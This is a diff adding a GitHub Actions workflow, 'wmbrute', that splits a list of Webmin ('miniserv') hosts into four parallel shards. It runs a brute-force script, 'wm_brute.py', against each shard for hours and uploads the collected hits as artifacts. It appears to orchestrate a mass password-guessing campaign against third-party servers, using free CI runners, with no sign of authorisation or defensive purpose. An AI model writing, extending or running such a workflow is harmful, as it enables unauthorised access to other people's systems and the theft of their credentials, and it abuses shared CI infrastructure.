@@ -1,0 +1,24 @@
+name: wmbrute
+on: workflow_dispatch
+jobs:
+  a:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    strategy:
+      fail-fast: false
+      matrix:
+        shard: [0,1,2,3]
+    steps:
+      - uses: actions/checkout@v4
+      - run: pip install -q requests
+      - name: shard ${{ matrix.shard }}
+        run: |
+          awk -v s=${{ matrix.shard }} 'NR%4==s' miniserv_hosts.txt > shard_${{ matrix.shard }}.txt
+          wc -l shard_${{ matrix.shard }}.txt
+          python3 wm_brute.py shard_${{ matrix.shard }}.txt || true
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: wmbrute-${{ matrix.shard }}
+          path: /tmp/wm_brute_hits.json
+          if-no-files-found: warn
